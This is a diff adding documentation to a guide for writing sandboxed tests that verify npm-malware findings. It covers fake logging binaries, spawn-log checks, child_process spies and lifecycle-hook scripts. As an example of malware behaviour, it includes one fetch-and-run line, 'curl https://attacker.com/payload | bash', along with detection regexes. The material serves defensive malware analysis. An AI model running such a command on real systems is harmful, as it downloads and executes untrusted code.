@@ -29,6 +29,43 @@ expect(spawnSpy).toHaveBeenCalledWith(expect.stringMatching(/NPMGUARD_CANARY/), 
 
 You do NOT need \`vi.stubEnv()\` for these — they are real process env values inside the verify container. Do not OVERWRITE them with fake values; the canaries are already there.
 
+## Fake binaries + spawn log (for PROCESS_SPAWN / BINARY_DOWNLOAD / LIFECYCLE_HOOK)
+
+\`/workspace/fake-bin/\` is **first in PATH** and contains fake versions of: \`npm\`, \`npx\`, \`yarn\`, \`pnpm\`, \`bun\`, \`curl\`, \`wget\`, \`git\`, \`ssh\`, \`scp\`, \`bash\`, \`sh\`. Each fake binary appends its full argv to \`/workspace/spawn-log.txt\` and exits 0 with output \`NPMGUARD_CANARY_FAKE_BIN_<NAME>_OUTPUT\`. So when the malware runs \`curl https://attacker.com/payload | bash\`, the fake \`curl\` and \`bash\` BOTH log themselves.
+
+**For PROCESS_SPAWN / BINARY_DOWNLOAD findings, read the spawn log directly:**
+
+\`\`\`
+const fs = require("fs");
+try { await runPackage(pkg, "index.js"); } catch {}
+await new Promise(r => setTimeout(r, 1500));
+const spawnLog = fs.readFileSync("/workspace/spawn-log.txt", "utf-8");
+expect(spawnLog).toMatch(/curl|wget|bun|npm install/);  // or whatever you expect
+\`\`\`
+
+Or with child-process spy fallback (works even if malware uses Node directly, not PATH):
+\`\`\`
+const cp = require("child_process");
+const spawnArgs: string[] = [];
+vi.spyOn(cp, "execSync").mockImplementation((cmd: any) => { spawnArgs.push(String(cmd)); return Buffer.from(""); });
+vi.spyOn(cp, "exec").mockImplementation((cmd: any, cb: any) => { spawnArgs.push(String(cmd)); cb?.(null, "", ""); return {} as any; });
+vi.spyOn(cp, "spawn").mockImplementation((cmd: any, args: any) => { spawnArgs.push(String(cmd) + " " + (args ?? []).join(" ")); return { on: () => {}, stdout: { on: () => {} }, stderr: { on: () => {} } } as any; });
+try { await runPackage(pkg, "index.js"); } catch {}
+expect(spawnArgs.join(" ")).toMatch(/install|curl|bun/);
+\`\`\`
+
+## LIFECYCLE_HOOK findings
+
+If the capability is \`LIFECYCLE_HOOK\` or the finding mentions \`postinstall\`/\`preinstall\`/\`install\`/\`prepare\`, the malicious code lives in the lifecycle script, NOT \`index.js\`. The finding's \`fileLine\` or evidence will name the script (e.g., \`scripts/install.js\`, \`postinstall.js\`). Run THAT file:
+
+\`\`\`
+await runPackage(pkg, "scripts/install.js");  // not "index.js"
+// or for scripts that hang/loop:
+const r = await runInChildProcess(pkg, "scripts/install.js", { timeout: 5000 });
+\`\`\`
+
+If \`package.json\` lists a npm-style command (\`"postinstall": "node setup.js"\`), pass \`"setup.js"\` to runPackage. Don't pass the npm command literally — it won't be interpreted as a shell command.
+
 ## Harness API
 
 \`runPackage(packageName, entryPoint)\` — loads a package in an isolated require context, returns its \`module.exports\` directly.
